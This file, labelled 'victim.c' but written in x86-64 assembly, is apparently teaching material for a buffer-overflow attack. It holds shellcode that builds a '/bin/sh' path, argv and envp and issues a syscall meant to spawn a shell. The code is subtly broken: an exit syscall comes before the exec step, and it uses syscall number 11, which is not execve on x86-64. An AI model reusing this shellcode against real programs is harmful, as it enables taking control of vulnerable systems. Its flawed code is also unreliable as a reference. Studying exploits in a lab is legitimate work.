/* victim.c */
/* Author: Zecheng He @ Princeton University */
/* Modified from https://github.com/npapernot/buffer-overflow-attack to support 64-bit machines*/

#include <sys/syscall.h>

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+8)

.globl main
        .type   main, @function

main:
        jmp callptr

payload:

        movq    $file_to_run, %rcx
        movq    %rcx, (%rcx)            /* set up argv pointer to pathname */

        movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
        syscall                          /* invoke syscall */

        xorq    %rax, %rax               /* get a 64-bit zero value */
        movq    %rax, (STRLEN)(%rcx)     /* null-terminate our string */
        movq    %rax, (ENVP)(%rcx)       /* set up null envp */

        movq    $11, %rax                /* syscall arg 1: syscall number */
        movq    %rcx, %rdi               /* syscall arg 2: string pathname */
        leaq    ARGV(%rcx), %rsi         /* syscall arg 2: argv */
        leaq    ENVP(%rcx), %rdx         /* syscall arg 3: envp */
        syscall                          /* invoke syscall */

        movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
        syscall                          /* invoke syscall */

callptr:
    call    payload                      /* push STRING ptr to stack */

.section .data
    .ascii  "aaaaaaaaaaaaaaaaaaaaaaaaaaa"
file_to_run:
    .ascii  STRING
    .ascii  "aaaaaaaaaaaaaaaaaaaaaaaaaaa"
